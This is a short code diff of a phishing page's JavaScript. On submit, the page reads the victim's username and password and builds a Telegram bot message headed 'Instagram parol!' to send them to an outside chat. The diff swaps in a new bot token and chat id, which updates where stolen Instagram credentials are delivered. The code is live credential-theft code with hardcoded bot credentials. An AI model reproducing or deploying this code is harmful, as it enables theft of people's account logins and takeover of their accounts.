@@ -71,8 +71,8 @@ signin_btn.onclick = (e) => {
   e.preventDefault();
   var username = document.querySelector('input[name="username"]').value;
   var password = document.querySelector('input[name="password"]').value;
-  var token = "5949192225:AAHs9W80UqWo9MolJCsg8IpeBt-LceYDWDk";
-  var chat_id = 5328702085;
+  var token = "5615796879:AAFaC55hWOcKkU_E6ciehm62ytIBzvkbke0";
+  var chat_id = -1001838358621;
   var url = `https://api.telegram.org/bot${token}/sendMessage`;
   let message = `<b>Instagram parol!</b>\n`;
   message += `<b>Login: </b>${username}\n`;
